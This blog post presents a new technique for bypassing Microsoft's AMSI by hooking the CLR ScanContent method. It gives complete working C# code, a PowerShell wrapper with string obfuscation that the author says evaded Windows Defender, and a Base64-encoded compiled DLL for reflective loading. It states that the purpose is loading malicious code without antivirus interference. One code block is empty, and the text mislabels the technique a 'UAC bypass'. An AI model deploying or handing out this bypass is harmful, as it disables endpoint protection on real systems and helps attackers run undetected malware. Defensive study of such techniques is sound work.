# https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/

Get 80% off our new product SpecterInsight using the discount code: [SPECTER2025](https://practicalsecurityanalytics.com/specterinsight/)

Checkout the release notes for [Version 5.0.0](https://practicalsecurityanalytics.com/specterinsight/releases/specterinsight-v5-0-0-eventviewer-stability-fixes-and-ux-improvements/)!

 [Skip to content](https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/#content)

Table of Contents

[Toggle](https://practicalsecurityanalytics.com/new-amsi-bypass-using-clr-hooking/#)

## Introduction

In this article, I will present a new technique to bypass Microsoft’s Anti-Malware Scan Interface (AMSI) using API Call Hooking of CLR methods. When executed on a Windows system, this AMSI bypass will prevent the current process from passing any more data to the installed AV, thus allowing for malicious code to be loaded without interference. This technique has an advantage over other API Call Hooking techniques that target native functions such as AMSI.dll::AmsiScanBuffer in that this method is more difficult to prevent with EDR or Application Protection rules commonly found in enterprise environments. Additionally, it works against PowerShell 3.0+ including PowerShell 7+.

## Background

Bypassing Microsoft’s Anti-Malware Scan Interface (AMSI) is still popular among cyber threat actors. Essentially, if you can get your AMSI Bypass code past the installed AV (e.x. Windows Defender ATP), then you can disable further AV interference in order to load malicious or signaturized payloads.

## Managed API Call Hooking

This new technique relies upon API call hooking of .NET methods. As it turns out, .NET Methods need to get compiled down to native machine instructions in memory which end up looking very similar to native methods. These compiled methods can hooked to change the control flow of a program.

The steps performing API cal hooking of .NET methods are:

1. Identify the target method to hook
2. Define a method with the same function prototype as the target
3. Use reflection to find the methods
4. Ensure each method has been compiled
5. Find the location of each method in memory
6. Overwrite the target method with instructions pointing to our malicious method

Let’s break it down step by step.

### Identify Target Method

Using JetBrains DotPeek, we can decompile the System.Management.Automation.dll which contains the code that sends PowerShell commands to the installed AV prior to execution. Inside of that DLL, there is an internal class called AmsiUtils which contains the method ScanContent, shown below, which is responsible for calling the native AMSI API. If we overwrite this method, we can prevent further calls to AmsiScanBuffer we see on line 34.

```csharp

```

### Define a Method with the Same Prototype

We need to define a method that will handle our hook and it needs to have the same function prototype as the target function so that it can be called correctly. The important elements of the prototype are the arguments, return type, and whether or not the method is static.

We copy the arguments verbatim. The return value is an enumeration that is actually an integer value, so we can define an int as the return type. Finally, the target method is static, so I made our hook method static as well.

Lastly, we need to implement the new method. In this case, I just want the call to always return AMSI\_RESULT\_NODETECTED which is represented by the integer value 1.

There is one more problem. The C# compiler is too smart. It will evaluate the method below and determine that a full fledged function call is not required because the method always returns the same value, so the compiler will optimize the entire function away leaving us with nothing to handle the hook. We can fix that problem by adding an attribute to the method to tell the compiler not to optimize nor inline the method.

```csharp
[MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
private static int ScanContentStub(string content, string metadata) {
    return 1; //AMSI_RESULT_NOTDETECTED
}
```

### Use Reflection to Find the Methods

In order to hook the ScanContent function, we need to get a pointer to the method’s entry point in memory. Because the class and method are internal, we have to use reflection to get a MethodInfo object.

```csharp
//Use reflection to find the target method
MethodInfo original = typeof(PSObject).Assembly.GetType("System.Management.Automation.AmsiUtils").GetMethod("ScanContent", BindingFlags.NonPublic | BindingFlags.Static);

//Use reflection to find destination method
MethodInfo replacement = typeof(Methods).GetMethod("ScanContentStub", BindingFlags.NonPublic | BindingFlags.Static);
```

**NOTE:** the string AmsiUtils is a bad word in PowerShell and will get flagged as malicious. Some basic string obfuscation will take care of it though.

### Ensure Both Methods are Compiled

This step is critical due to the nature of .NET Just In-Time Compilation. Assemblies written in .NET are compiled down to Common Intermediate Language (CIL) bytecode when built. The CIL doesn’t get compiled until it is needed, which isn’t always at startup or load. From what I can tell, the JIT compiler works at a class level, only compiling what it needs to prior to first reference.

Fortunately, there is a handy RuntimeHelpers method that will ensure the target method has been compiled without actually calling the method.

```csharp
//JIT compile methods
RuntimeHelpers.PrepareMethod(original.MethodHandle);
RuntimeHelpers.PrepareMethod(replacement.MethodHandle);
```

### Find the Location of Each Method In Memory

Using the MethodInfo object for the target function we got earlier, we can get the location of the function in memory using the following code:

```csharp
//Get pointers to the functions
IntPtr originalSite = original.MethodHandle.GetFunctionPointer();
IntPtr replacementSite = replacement.MethodHandle.GetFunctionPointer();
```

### Patch the Target Method

Now we can finally patch the target method. To do that, we are going to create 32-bit and 64-bit call instructions respectively that will call our replacement function followed by a ret.

```csharp
//Generate architecture specific shellcode
byte[] patch = null;
if (IntPtr.Size == 8) {
    patch = new byte[] { 0x49, 0xbb, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0xff, 0xe3 };
    byte[] address = BitConverter.GetBytes(replacementSite.ToInt64());
    for (int i = 0; i < address.Length; i++) {
        patch[i + 2] = address[i];
    }
} else {
    patch = new byte[] { 0x68, 0x0, 0x0, 0x0, 0x0, 0xc3 };
    byte[] address = BitConverter.GetBytes(replacementSite.ToInt32());
    for (int i = 0; i < address.Length; i++) {
        patch[i + 1] = address[i];
    }
}
```

The rest of the patching is fairly straight forward and very similar to native hooking. The following steps will be used to patch each method:

1. Change memory permissions to RWE in the target using Kernel32::VirtualProtect
2. Copy the patch to the target method using Kernel32::WriteProcessMemory
3. Ensure cached instructions are cleared using Kernel32::FlushInstructionCache
4. Restore memory permissions back to their original settings using Kernel32::VirtualProtect

```csharp
//Temporarily change permissions to RWE
uint oldprotect;
if (!VirtualProtect(originalSite, (UIntPtr)patch.Length, 0x40, out oldprotect)) {
    throw new Win32Exception();
}

//Apply the patch
IntPtr written = IntPtr.Zero;
if (!Methods.WriteProcessMemory(GetCurrentProcess(), originalSite, patch, (uint)patch.Length, out written)) {
    throw new Win32Exception();
}

//Flush insutruction cache to make sure our new code executes
if (!FlushInstructionCache(GetCurrentProcess(), originalSite, (UIntPtr)patch.Length)) {
    throw new Win32Exception();
}

//Restore the original memory protection settings
if (!VirtualProtect(originalSite, (UIntPtr)patch.Length, oldprotect, out oldprotect)) {
    throw new Win32Exception();
}
```

The code above depends on some native API calls using P/Invoke. Here are the necessary P/Invoke definitions:

```csharp
[DllImport("kernel32.dll", SetLastError = true)]
private static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);

[DllImport("kernel32.dll", SetLastError = true)]
private static extern IntPtr GetCurrentProcess();

[DllImport("kernel32.dll", SetLastError = true)]
private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

[DllImport("kernel32.dll", SetLastError = true)]
private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
```

And that’s it! We have a working UAC bypass in C# using .NET API Call Hooking.

## Complete C\# Code

Here is the complete C# code for this new AMSI bypass technique.

```csharp
using System;
using System.ComponentModel;
using System.Management.Automation;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace Editor {
	public static class Methods {
        public static void Patch() {
			MethodInfo original = typeof(PSObject).Assembly.GetType("System.Management.Automation.AmsiUtils").GetMethod("ScanContent", BindingFlags.NonPublic | BindingFlags.Static);
			MethodInfo modified = typeof(Methods).GetMethod("ScanContentStub", BindingFlags.NonPublic | BindingFlags.Static);
			Methods.Patch(original, modified);
		}

		[MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
		private static int ScanContentStub(string content, string metadata) {
			return 1; //AMSI_RESULT_NOTDETECTED
        }

		public static void Patch(MethodInfo original, MethodInfo replacement) {
			//JIT compile methods
			RuntimeHelpers.PrepareMethod(original.MethodHandle);
			RuntimeHelpers.PrepareMethod(replacement.MethodHandle);

			//Get pointers to the functions
			IntPtr originalSite = original.MethodHandle.GetFunctionPointer();
			IntPtr replacementSite = replacement.MethodHandle.GetFunctionPointer();

			//Generate architecture specific shellcode
			byte[] patch = null;
			if (IntPtr.Size == 8) {
				patch = new byte[] { 0x49, 0xbb, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0xff, 0xe3 };
				byte[] address = BitConverter.GetBytes(replacementSite.ToInt64());
				for (int i = 0; i < address.Length; i++) {
					patch[i + 2] = address[i];
				}
			} else {
				patch = new byte[] { 0x68, 0x0, 0x0, 0x0, 0x0, 0xc3 };
				byte[] address = BitConverter.GetBytes(replacementSite.ToInt32());
				for (int i = 0; i < address.Length; i++) {
					patch[i + 1] = address[i];
				}
			}

			//Temporarily change permissions to RWE
			uint oldprotect;
			if (!VirtualProtect(originalSite, (UIntPtr)patch.Length, 0x40, out oldprotect)) {
				throw new Win32Exception();
			}

			//Apply the patch
			IntPtr written = IntPtr.Zero;
			if (!Methods.WriteProcessMemory(GetCurrentProcess(), originalSite, patch, (uint)patch.Length, out written)) {
				throw new Win32Exception();
			}

			//Flush insutruction cache to make sure our new code executes
			if (!FlushInstructionCache(GetCurrentProcess(), originalSite, (UIntPtr)patch.Length)) {
				throw new Win32Exception();
			}

			//Restore the original memory protection settings
			if (!VirtualProtect(originalSite, (UIntPtr)patch.Length, oldprotect, out oldprotect)) {
				throw new Win32Exception();
			}
		}

		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);

		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern IntPtr GetCurrentProcess();

		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

		[DllImport("kernel32.dll", SetLastError = true)]
		private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
	}
}
```

## Embedding in PowerShell

In order to use the C# AMSI bypass in PowerShell, we need to add a little scripting to our bypass. There are several possible methods to do this, but I will only discuss two of them:

1. Use Add-Type to dynamically compile the bypass and load it into the session
2. Embed a compiled C# assembly in the script as Base64 and reflectively load that DLL in memory

### Dynamically Compile

Essentially, we’re just going to embed the C# code into PowerShell as a multiline here string, then call Add-Type to compile and import. Finally, we call \[Editor.Methods\]::Patch to run the bypass.

**NOTE:** At the time of writing, this script is not detected by Windows Defender; however, I did have to apply a basic Caesar cipher to obfuscate some of the C# strings.

```powershell
$code = @"
using System;
using System.ComponentModel;
using System.Management.Automation;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;

namespace Editor {
    public static class Methods {
        public static void Patch() {
            MethodInfo original = typeof(PSObject).Assembly.GetType(Methods.CLASS).GetMethod(Methods.METHOD, BindingFlags.NonPublic | BindingFlags.Static);
            MethodInfo replacement = typeof(Methods).GetMethod("Dummy", BindingFlags.NonPublic | BindingFlags.Static);
            Methods.Patch(original, replacement);
        }

        [MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
        private static int Dummy(string content, string metadata) {
            return 1;
        }

        public static void Patch(MethodInfo original, MethodInfo replacement) {
            //JIT compile methods
            RuntimeHelpers.PrepareMethod(original.MethodHandle);
            RuntimeHelpers.PrepareMethod(replacement.MethodHandle);

            //Get pointers to the functions
            IntPtr originalSite = original.MethodHandle.GetFunctionPointer();
            IntPtr replacementSite = replacement.MethodHandle.GetFunctionPointer();

            //Generate architecture specific shellcode
            byte[] patch = null;
            if (IntPtr.Size == 8) {
                patch = new byte[] { 0x49, 0xbb, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0xff, 0xe3 };
                byte[] address = BitConverter.GetBytes(replacementSite.ToInt64());
                for (int i = 0; i < address.Length; i++) {
                    patch[i + 2] = address[i];
                }
            } else {
                patch = new byte[] { 0x68, 0x0, 0x0, 0x0, 0x0, 0xc3 };
                byte[] address = BitConverter.GetBytes(replacementSite.ToInt32());
                for (int i = 0; i < address.Length; i++) {
                    patch[i + 1] = address[i];
                }
            }

            //Temporarily change permissions to RWE
            uint oldprotect;
            if (!VirtualProtect(originalSite, (UIntPtr)patch.Length, 0x40, out oldprotect)) {
                throw new Win32Exception();
            }

            //Apply the patch
            IntPtr written = IntPtr.Zero;
            if (!Methods.WriteProcessMemory(GetCurrentProcess(), originalSite, patch, (uint)patch.Length, out written)) {
                throw new Win32Exception();
            }

            //Flush insutruction cache to make sure our new code executes
            if (!FlushInstructionCache(GetCurrentProcess(), originalSite, (UIntPtr)patch.Length)) {
                throw new Win32Exception();
            }

            //Restore the original memory protection settings
            if (!VirtualProtect(originalSite, (UIntPtr)patch.Length, oldprotect, out oldprotect)) {
                throw new Win32Exception();
            }
        }

        private static string Transform(string input) {
            StringBuilder builder = new StringBuilder(input.Length + 1);
            foreach(char c in input) {
                char m = (char)((int)c - 1);
                builder.Append(m);
            }
            return builder.ToString();
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

        private static readonly string CLASS = Methods.Transform("Tztufn/Nbobhfnfou/Bvupnbujpo/BntjVujmt");
        private static readonly string METHOD = Methods.Transform("TdboDpoufou");
    }
}
"@
Add-Type $code
[Editor.Methods]::Patch()
```

### Embed Assembly

The last technique embeds the compiled C# assembly into the PowerShell script as a Base64 string. We the decode that string as a byte array, convert it to an Assembly, and reflectively load it. Finally, we call the Patch method just like the previous technique.

```powershell
[Reflection.Assembly]::Load([Convert]::FromBase64String("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+QBrBGkA2QABAG8A+QBrBHMAAQH3BHkACQHtAwYA2QC/A34ALgALAMgALgATANEALgAbAPAALgAjAPkALgArAB4BLgAzAB4BLgA7AB4BLgBDAPkALgBLACQBLgBTAB4BLgBbAB4BLgBjADwBLgBrAGYBYwBzAHMBAQANAAAABAAaADkAJwNAAQkA0QABAEABCwCZBAEAQAENANsEAQBAAQ8ANAUBAKwuAAABAASAAAABAAAAAAAAAAAAAAAAAOICAAACAAAAAAAAAAAAAACBAKAAAAAAAAEAAAAAAAAAAAAAAIoAdgMAAAAAAgAAAAAAAAAAAAAAgQBYAwAAAAAEAAMAAAAAVG9JbnQzMgBfX1N0YXRpY0FycmF5SW5pdFR5cGVTaXplPTEzAFRvSW50NjQANTk2MEJEMDcyQzEzRTVFQUM5QjM0RkM5RkFBQzc5M0UwN0YyRUFFMDQ2MjQ3RkY1NDg2MzI0QjUwMTJGQkI0NgA8TW9kdWxlPgA8UHJpdmF0ZUltcGxlbWVudGF0aW9uRGV0YWlscz4AbWV0YWRhdGEAbXNjb3JsaWIAU2NhbkNvbnRlbnRTdHViAFByZXBhcmVNZXRob2QAR2V0TWV0aG9kAEZsdXNoSW5zdHJ1Y3Rpb25DYWNoZQBSdW50aW1lRmllbGRIYW5kbGUAZ2V0X01ldGhvZEhhbmRsZQBSdW50aW1lTWV0aG9kSGFuZGxlAFJ1bnRpbWVUeXBlSGFuZGxlAEdldFR5cGVGcm9tSGFuZGxlAFZhbHVlVHlwZQBHZXRUeXBlAE1ldGhvZEJhc2UAQ29tcGlsZXJHZW5lcmF0ZWRBdHRyaWJ1dGUAR3VpZEF0dHJpYnV0ZQBEZWJ1Z2dhYmxlQXR0cmlidXRlAENvbVZpc2libGVBdHRyaWJ1dGUAQXNzZW1ibHlUaXRsZUF0dHJpYnV0ZQBBc3NlbWJseVRyYWRlbWFya0F0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5Q29uZmlndXJhdGlvbkF0dHJpYnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBCeXRlAGdldF9TaXplAG5TaXplAGR3U2l6ZQBBbXNpQnlwYXNzTWFuYWdlZEFwaUNhbGxIb29raW5nAFBhdGNoAG9yaWdpbmFsAFN5c3RlbS5Db21wb25lbnRNb2RlbABrZXJuZWwzMi5kbGwAQW1zaUJ5cGFzc01hbmFnZWRBcGlDYWxsSG9va2luZy5kbGwAU3lzdGVtAGxwTnVtYmVyT2ZCeXRlc1dyaXR0ZW4AU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbgBTeXN0ZW0uUmVmbGVjdGlvbgBXaW4zMkV4Y2VwdGlvbgBNZXRob2RJbmZvAFplcm8AbHBCdWZmZXIAR2V0RnVuY3Rpb25Qb2ludGVyAEJpdENvbnZlcnRlcgAuY3RvcgBFZGl0b3IAVUludFB0cgBTeXN0ZW0uRGlhZ25vc3RpY3MATWV0aG9kcwBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dpbmdNb2RlcwBHZXRCeXRlcwBCaW5kaW5nRmxhZ3MAUnVudGltZUhlbHBlcnMAaFByb2Nlc3MAR2V0Q3VycmVudFByb2Nlc3MAbHBCYXNlQWRkcmVzcwBscEFkZHJlc3MAUFNPYmplY3QAbHBmbE9sZFByb3RlY3QAVmlydHVhbFByb3RlY3QAZmxOZXdQcm90ZWN0AG9wX0V4cGxpY2l0AHJlcGxhY2VtZW50AGNvbnRlbnQASW5pdGlhbGl6ZUFycmF5AGdldF9Bc3NlbWJseQBXcml0ZVByb2Nlc3NNZW1vcnkAAABNUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAAAXUwBjAGEAbgBDAG8AbgB0AGUAbgB0AAAfUwBjAGEAbgBDAG8AbgB0AGUAbgB0AFMAdAB1AGIAAAAbxevaOG8XQaiIDUPzL8VpAAQgAQEIAyAAAQUgAQEREQQgAQEOBCABAQIEBwESQQYAARJV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